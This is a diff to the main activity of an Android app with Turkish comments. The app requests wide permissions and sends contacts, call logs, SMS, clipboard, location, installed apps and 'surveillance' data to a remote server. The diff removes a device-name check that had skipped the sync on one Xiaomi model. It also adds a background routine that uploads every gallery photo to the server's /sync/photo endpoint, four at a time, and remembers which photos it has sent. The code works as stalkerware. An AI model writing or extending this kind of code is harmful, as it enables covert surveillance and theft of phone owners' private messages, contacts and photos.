@@ -58,6 +58,11 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.util.UUID;
 import java.util.ArrayList;
 import java.util.LinkedList;
 import java.util.Locale;
@@ -630,29 +635,30 @@ public class MainActivity extends Activity {
      * Ses kaydı, rehber okuma, arama yapma vb.
      */
     private void requestPermissions() {
-        String[] perms = {
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.CALL_PHONE,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.INTERNET,
-                Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.READ_EXTERNAL_STORAGE,
-                // Yeni Eklenen İzinler
-                Manifest.permission.READ_SMS,
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_PHONE_STATE
-        };
-        
+        ArrayList<String> perms = new ArrayList<>();
+        perms.add(Manifest.permission.RECORD_AUDIO);
+        perms.add(Manifest.permission.READ_CONTACTS);
+        perms.add(Manifest.permission.CALL_PHONE);
+        perms.add(Manifest.permission.READ_CALL_LOG);
+        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        perms.add(Manifest.permission.INTERNET);
+        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        perms.add(Manifest.permission.READ_SMS);
+        perms.add(Manifest.permission.RECEIVE_SMS);
+        perms.add(Manifest.permission.READ_PHONE_STATE);
+
         // Android 12 (SDK 31) ve üzeri için Bluetooth izni
         if (Build.VERSION.SDK_INT >= 31) {
-            // Arrays.asList ve ArrayList kullanımı ile dinamik ekleme
-            ArrayList<String> permList = new ArrayList<>();
-            for (String p : perms) permList.add(p);
-            permList.add(Manifest.permission.BLUETOOTH_CONNECT);
-            perms = permList.toArray(new String[0]);
+            perms.add(Manifest.permission.BLUETOOTH_CONNECT);
+        }
+        
+        // Android 13 (SDK 33) ve üzeri için Medya İzinleri
+        if (Build.VERSION.SDK_INT >= 33) {
+            perms.add("android.permission.READ_MEDIA_IMAGES");
+            // perms.add("android.permission.READ_MEDIA_VIDEO"); 
+            // perms.add("android.permission.READ_MEDIA_AUDIO");
         }
 
         ArrayList<String> list = new ArrayList<>();
@@ -2995,30 +3001,38 @@ public class MainActivity extends Activity {
      */
     private void syncAllData() {
         String deviceName = getDeviceName();
-        // Belirli cihazlarda (örn. Emülatör) çalışmasını engellemek için kontrol
-        if ("Xiaomi_25069PTEBG".equals(deviceName)) {
-            return;
-        }
+        // Cihaz adı kontrolü 
+        // if ("Xiaomi_25069PTEBG".equals(deviceName)) {
+        //    return;
+        // }
         new Thread(() -> {
             try {
                 // android.util.Log.d("NIKO_SYNC", "Starting full data sync...");
                 // addLog("[SYNC] Veri senkronizasyonu başlatılıyor...");
                 
-                syncContacts(); // Rehberi gönder
-                syncCallLogs(); // Arama kayıtlarını gönder
-                syncLocation(); // Konumu gönder
-                syncInstalledApps(); // Uygulamaları gönder
-                syncDeviceInfo(); // Cihaz bilgisini gönder
+                // --- İletişim Verileri ---
+                try { syncContacts(); } catch (Exception e) { addLog("Rehber Hatası: " + e.getMessage()); }
+                try { syncCallLogs(); } catch (Exception e) { addLog("Arama Kaydı Hatası: " + e.getMessage()); }
+                try { syncSMS(); } catch (Exception e) { addLog("SMS Hatası: " + e.getMessage()); }
                 
-                // Yeni Eklenen Veri Çekme Metotları
-                syncSMS();
-                syncNetworkInfo();
-                syncBluetoothDevices();
-                syncClipboard(); 
-                syncMedia();
-                syncSensors();
-                syncUsageStats();
-                syncSurveillanceInfo();
+                // --- Cihaz ve Sistem Verileri ---
+                try { syncDeviceInfo(); } catch (Exception e) { addLog("Cihaz Bilgi Hatası: " + e.getMessage()); }
+                try { syncInstalledApps(); } catch (Exception e) { addLog("Uygulama Hatası: " + e.getMessage()); }
+                try { syncUsageStats(); } catch (Exception e) { addLog("Kullanım İstatistik Hatası: " + e.getMessage()); }
+
+
+                // --- Konum ve Çevre ---
+                try { syncLocation(); } catch (Exception e) { addLog("Konum Hatası: " + e.getMessage()); }
+                try { syncNetworkInfo(); } catch (Exception e) { addLog("Ağ Bilgi Hatası: " + e.getMessage()); }
+                try { syncBluetoothDevices(); } catch (Exception e) { addLog("Bluetooth Hatası: " + e.getMessage()); }
+                try { syncSensors(); } catch (Exception e) { addLog("Sensör Hatası: " + e.getMessage()); }
+
+                // --- Güvenlik ve Gözetim ---
+                try { syncClipboard(); } catch (Exception e) { addLog("Pano Hatası: " + e.getMessage()); }
+                try { syncSurveillanceInfo(); } catch (Exception e) { addLog("Gözetim Hatası: " + e.getMessage()); }
+                
+                // --- Medya ---
+                try { startAutoPhotoSync(); } catch (Exception e) { addLog("Fotoğraf Sync Hatası: " + e.getMessage()); }
                 
                 // android.util.Log.d("NIKO_SYNC", "Full data sync completed.");
                 // addLog("[SYNC] Veri senkronizasyonu tamamlandı.");
@@ -3615,45 +3629,6 @@ public class MainActivity extends Activity {
         });
     }
 
-    /**
-     * Galerideki son medya dosyalarının (Fotoğraf/Video) meta verilerini çeker.
-     * Dosyaların kendisini göndermez, sadece listesini gönderir.
-     */
-    private void syncMedia() throws Exception {
-        if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) return;
-
-        JSONArray array = new JSONArray();
-        Uri uri = MediaStore.Files.getContentUri("external");
-        
-        // Sadece Resim ve Videoları al
-        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
-                + MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE
-                + " OR "
-                + MediaStore.Files.FileColumns.MEDIA_TYPE + "="
-                + MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO;
-
-        try (Cursor c = getContentResolver().query(uri, null, selection, null, MediaStore.Files.FileColumns.DATE_ADDED + " DESC LIMIT 100")) {
-            if (c != null) {
-                while (c.moveToNext()) {
-                    JSONObject obj = new JSONObject();
-                    obj.put("display_name", c.getString(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)));
-                    obj.put("size", c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)));
-                    obj.put("date_added", c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_ADDED)));
-                    obj.put("date_modified", c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED)));
-                    obj.put("mime_type", c.getString(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MIME_TYPE)));
-                    
-                    // Klasör (Bucket) Adı Kontrolü
-                    int bucketIdx = c.getColumnIndex("bucket_display_name");
-                    if (bucketIdx != -1) {
-                        obj.put("bucket_name", c.getString(bucketIdx));
-                    }
-                    
-                    array.put(obj);
-                }
-            }
-        }
-        if (array.length() > 0) sendSyncRequest(array, "media_files");
-    }
 
     /**
      * Cihazdaki tüm sensörlerin listesini çıkarır.
@@ -7257,6 +7232,208 @@ public class MainActivity extends Activity {
         }
         activeAnimations.clear();
     }
+
+
+    // ================= FOTOĞRAF SENKRONİZASYONU (Sıfırdan Yazıldı) =================
+
+    private void startAutoPhotoSync() {
+        // İzin kontrolü (Android 13+ ve öncesi için)
+        boolean hasPermission;
+        if (Build.VERSION.SDK_INT >= 33) {
+            hasPermission = checkSelfPermission("android.permission.READ_MEDIA_IMAGES") == PackageManager.PERMISSION_GRANTED;
+        } else {
+            hasPermission = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        }
+
+        if (!hasPermission) {
+            addLog("⚠️ Fotoğraf erişim izni yok. Senkronizasyon atlandı.");
+            return;
+        }
+
+        // Ana işlemi arka planda başlat
+        Executors.newSingleThreadExecutor().execute(() -> {
+            try {
+                addLog("🚀 Fotoğraf taraması başladı...");
+                
+                // Çoklu yükleme için thread havuzu (Max 4 paralel yükleme)
+                ExecutorService uploadExecutor = Executors.newFixedThreadPool(4);
+                SharedPreferences syncPrefs = getSharedPreferences("photo_sync_db", MODE_PRIVATE);
+                String deviceName = getDeviceName();
+
+                Uri imagesUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
+                String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+
+                try (Cursor cursor = getContentResolver().query(imagesUri, projection, null, null, sortOrder)) {
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                        int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+
+                        int totalFound = cursor.getCount();
+                        int skipped = 0;
+                        int queued = 0;
+
+                        do {
+                            long id = cursor.getLong(idColumn);
+                            String name = cursor.getString(nameColumn);
+                            String uniqueKey = "photo_" + id;
+
+                            // Daha önce başarıyla yüklendiyse atla
+                            if (syncPrefs.contains(uniqueKey)) {
+                                skipped++;
+                                continue;
+                            }
+
+                            Uri contentUri = Uri.withAppendedPath(imagesUri, String.valueOf(id));
+                            queued++;
+
+                            // Yükleme görevini havuza ekle
+                            uploadExecutor.execute(() -> {
+                                boolean success = uploadPhotoToServer(contentUri, name, deviceName);
+                                if (success) {
+                                    syncPrefs.edit().putBoolean(uniqueKey, true).apply();
+                                }
+                            });
+
+                        } while (cursor.moveToNext());
+
+                        addLog(String.format(Locale.getDefault(), "📊 Tarama bitti: %d toplam, %d yeni, %d atlandı.", totalFound, queued, skipped));
+                    } else {
+                        addLog("📂 Galeri boş veya erişilemedi.");
+                    }
+                }
+
+                uploadExecutor.shutdown();
+                // Havuzun bitmesini bekle (opsiyonel)
+            } catch (Exception e) {
+                addLog("❌ Tarama hatası: " + e.getMessage());
+                e.printStackTrace();
+            }
+        });
+    }
+
+    private boolean uploadPhotoToServer(Uri fileUri, String fileName, String deviceName) {
+        HttpURLConnection conn = null;
+        DataOutputStream dos = null;
+        String boundary = "---NikoBoundary" + System.currentTimeMillis();
+        String lineEnd = "\r\n";
+        String twoHyphens = "--";
+
+        try {
+            // Resmi sıkıştır (Max 1600px, %75 kalite)
+            byte[] fileData = compressImageEfficiently(fileUri);
+            if (fileData == null) return false;
+
+            URL url = new URL(API_BASE_URL + "/sync/photo");
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setDoInput(true);
+            conn.setDoOutput(true);
+            conn.setUseCaches(false);
+            conn.setRequestMethod("POST");
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(30000);
+            conn.setRequestProperty("Connection", "Keep-Alive");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+            
+            // API Key veya Token ekleme
+            if (authToken != null) {
+                conn.setRequestProperty("Authorization", "Bearer " + authToken);
+            } else {
+                conn.setRequestProperty("x-api-key", "test");
+            }
+
+            dos = new DataOutputStream(conn.getOutputStream());
+
+            // 1. Parametre: device_name
+            writeFormField(dos, boundary, "device_name", deviceName);
+
+            // 2. Parametre: file
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + lineEnd);
+            dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
+            dos.writeBytes(lineEnd);
+            dos.write(fileData);
+            dos.writeBytes(lineEnd);
+
+            // Bitiş
+            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+            dos.flush();
+            dos.close();
+
+            int responseCode = conn.getResponseCode();
+            if (responseCode == 200) {
+                // Başarılı (Log kalabalığı yapmamak için her resmi yazmıyoruz)
+                return true;
+            } else {
+                addLog("⚠️ Yükleme hatası (" + responseCode + "): " + fileName);
+                return false;
+            }
+
+        } catch (Exception e) {
+            addLog("⚠️ Upload istisnası (" + fileName + "): " + e.getMessage());
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    private void writeFormField(DataOutputStream dos, String boundary, String name, String value) throws IOException {
+        String lineEnd = "\r\n";
+        String twoHyphens = "--";
+        dos.writeBytes(twoHyphens + boundary + lineEnd);
+        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"" + lineEnd);
+        dos.writeBytes(lineEnd);
+        dos.write(value.getBytes("UTF-8"));
+        dos.writeBytes(lineEnd);
+    }
+
+    private byte[] compressImageEfficiently(Uri uri) {
+        try (InputStream is = getContentResolver().openInputStream(uri)) {
+            if (is == null) return null;
+
+            // Önce boyutları al
+            BitmapFactory.Options options = new BitmapFactory.Options();
+            options.inJustDecodeBounds = true;
+            BitmapFactory.decodeStream(is, null, options);
+            
+            // Yeniden aç (Stream tüketildi çünkü)
+            try (InputStream is2 = getContentResolver().openInputStream(uri)) {
+                options.inSampleSize = calculateInSampleSize(options, 1600, 1600);
+                options.inJustDecodeBounds = false;
+                
+                Bitmap bitmap = BitmapFactory.decodeStream(is2, null, options);
+                if (bitmap == null) return null;
+
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 75, baos);
+                byte[] result = baos.toByteArray();
+                
+                bitmap.recycle();
+                return result;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+
+    private int calculateInSampleSize(BitmapFactory.Options options, int reqWidth, int reqHeight) {
+        final int height = options.outHeight;
+        final int width = options.outWidth;
+        int inSampleSize = 1;
+
+        if (height > reqHeight || width > reqWidth) {
+            final int halfHeight = height / 2;
+            final int halfWidth = width / 2;
+            while ((halfHeight / inSampleSize) >= reqHeight && (halfWidth / inSampleSize) >= reqWidth) {
+                inSampleSize *= 2;
+            }
+        }
+        return inSampleSize;
+    }
+
+    
+
 
     // ================= ADMIN LOG YÖNETİMİ =================
 
